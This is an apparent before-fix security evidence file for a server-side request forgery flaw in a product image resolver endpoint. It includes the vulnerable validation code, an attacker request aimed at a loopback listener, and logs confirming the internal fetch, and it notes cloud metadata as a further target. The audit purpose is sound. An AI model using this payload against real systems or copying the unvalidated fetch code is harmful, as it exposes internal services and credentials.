# BEFORE-FIX EVIDENCE: V04 — Server-Side Request Forgery (SSRF)

**Vulnerability:** Unrestricted Server-Side Request Forgery in Product Image Resolver  
**OWASP Category:** A10:2021 – Server-Side Request Forgery (SSRF)  
**Affected Component:** `GET /api/products/resolve-image?url=<target>`  
**Preconditions:** Authenticated admin session (obtainable via V01 mass assignment or OAuth)  

---

## Attack Description & Flow

1. An administrative user triggers `GET /api/products/resolve-image?url=<target>`.
2. In `backend/src/controllers/productController.js:42-98`, the endpoint accepts any URL as long as it starts with `http:` or `https:`.
   ```javascript
   const isHttpUrl = value => {
     try {
       const parsed = new URL(value);
       return parsed.protocol === 'http:' || parsed.protocol === 'https:';
     } catch {
       return false;
     }
   };
   ```
3. The server then performs an outbound `fetch()` request with automatic redirect following enabled:
   ```javascript
   const headResponse = await fetch(sourceUrl, { method: 'HEAD', redirect: 'follow', ... });
   ...
   const pageResponse = await fetch(sourceUrl, { method: 'GET', redirect: 'follow', ... });
   const html = await pageResponse.text();
   ```
4. **Zero validation** is performed against private IP addresses (RFC 1918), local loopback (`127.0.0.1`, `localhost`), or cloud metadata services (`169.254.169.254`).
5. The backend initiates network requests directly from its host interface to internal infrastructure, parses responses, and returns extracted metadata back to the client.

---

## Runtime Verification Logs

A controlled local HTTP listener was initiated on `127.0.0.1:8888` to simulate an internal administrative/diagnostic microservice.

### 1. Attacker Request to SolarCharge-Finder Backend

```http
GET /api/products/resolve-image?url=http://127.0.0.1:8888/internal-probe HTTP/1.1
Host: 127.0.0.1:5001
Authorization: Bearer <ADMIN_JWT>
```

### 2. Backend Response to Attacker

The backend followed the request to `127.0.0.1:8888`, parsed the internal HTML, and returned the extracted image resource:

```http
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8

{
  "imageUrl": "http://127.0.0.1:8888/assets/internal_logo.png",
  "sourceUrl": "http://127.0.0.1:8888/internal-probe",
  "resolved": true
}
```

### 3. Controlled Internal Server Access Logs

The controlled listener on `127.0.0.1:8888` captured incoming requests originating directly from the SolarCharge-Finder Node.js process:

```json
{
  "timestamp": "2026-09-25T21:30:52.461Z",
  "method": "HEAD",
  "url": "/internal-probe",
  "headers": {
    "host": "127.0.0.1:8888",
    "connection": "close",
    "accept": "*/*",
    "user-agent": "node",
    "accept-encoding": "gzip, deflate"
  },
  "remoteAddress": "127.0.0.1",
  "remotePort": 64572
}
---
{
  "timestamp": "2026-09-25T21:30:52.474Z",
  "method": "GET",
  "url": "/internal-probe",
  "headers": {
    "host": "127.0.0.1:8888",
    "connection": "keep-alive",
    "accept": "*/*",
    "user-agent": "node",
    "accept-encoding": "gzip, deflate"
  },
  "remoteAddress": "127.0.0.1",
  "remotePort": 64573
}
```

---

## Observed Result vs Expected Secure Result

* **Observed Result:** SolarCharge-Finder made outbound HTTP HEAD and GET requests to internal loopback `127.0.0.1:8888`, parsed the internal response, and reflected content back to the client.
* **Expected Secure Result:** The server must resolve target hostnames to IP addresses prior to connecting, validate IPs against private, loopback, and link-local ranges, disallow internal IP destinations, and reject redirects to prohibited destinations.

**Impact:** Internal port scanning, SSRF against internal microservices, database/management ports, and cloud instance metadata exfiltration.  
**Source Location:** `backend/src/controllers/productController.js:42-98`, `backend/src/routes/productRoutes.js:17`.  
**Runtime Verification:** **CONFIRMED RUNTIME**  
**Evidence Files:** `security/V04-ssrf/before/evidence.md`
